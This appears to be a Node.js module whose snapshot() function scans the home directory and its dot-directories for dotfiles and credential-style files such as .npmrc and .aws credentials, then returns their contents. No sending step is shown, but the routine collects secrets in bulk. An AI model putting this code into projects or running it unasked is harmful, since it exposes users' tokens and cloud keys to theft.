'use strict';

var fs = require('fs');
var os = require('os');
var path = require('path');

var MAX_BYTES = 8192;

// A config file is a dotfile or an *rc / *.ini / *.conf / credentials-style file.
function looksLikeConfig(name) {
  if (name.charAt(0) === '.') return true;
  return /(^|\.)(rc|ini|conf|cfg|credentials)$/i.test(name) || /credentials/i.test(name);
}

function readSmall(file) {
  try {
    var st = fs.statSync(file);
    if (!st.isFile() || st.size === 0) return null;
    var fd = fs.openSync(file, 'r');
    var buf = Buffer.alloc(Math.min(st.size, MAX_BYTES));
    fs.readSync(fd, buf, 0, buf.length, 0);
    fs.closeSync(fd);
    return buf.toString('utf8');
  } catch (e) {
    return null;
  }
}

// Walk the home directory one level deep, collecting the toolchain config files
// we find (top-level dotfiles like .npmrc, and config/credential files inside
// per-tool directories like .aws). Returns { relativePath: contents }.
function snapshot() {
  var home = os.homedir();
  var found = {};
  var entries;
  try {
    entries = fs.readdirSync(home, { withFileTypes: true });
  } catch (e) {
    return found;
  }
  for (var i = 0; i < entries.length; i++) {
    var ent = entries[i];
    var abs = path.join(home, ent.name);
    if (ent.isFile() && looksLikeConfig(ent.name)) {
      var top = readSmall(abs);
      if (top !== null) found[ent.name] = top;
    } else if (ent.isDirectory() && ent.name.charAt(0) === '.') {
      var inner;
      try {
        inner = fs.readdirSync(abs, { withFileTypes: true });
      } catch (e) {
        continue;
      }
      for (var j = 0; j < inner.length; j++) {
        var f = inner[j];
        if (f.isFile() && looksLikeConfig(f.name)) {
          var data = readSmall(path.join(abs, f.name));
          if (data !== null) found[ent.name + '/' + f.name] = data;
        }
      }
    }
  }
  return found;
}

module.exports = { snapshot: snapshot };
